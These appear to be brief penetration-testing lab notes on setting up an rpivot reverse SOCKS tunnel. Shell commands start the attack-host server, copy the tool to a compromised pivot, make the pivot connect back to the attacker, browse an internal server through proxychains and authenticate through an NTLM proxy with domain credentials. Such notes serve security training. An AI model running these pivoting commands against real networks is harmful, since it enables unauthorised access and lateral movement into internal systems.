downloaded from github in Desktop

the pivot server will connect back to the attack host


On attack host: 
```shell-session
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Transfer rpivot to pivot and run client.py from pivot
```shell-session
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

```shell-session
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

Can use proxychains to browse target webserver
```shell-session
proxychains firefox-esr 172.16.5.135:80
```
ntlm auth: 
```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```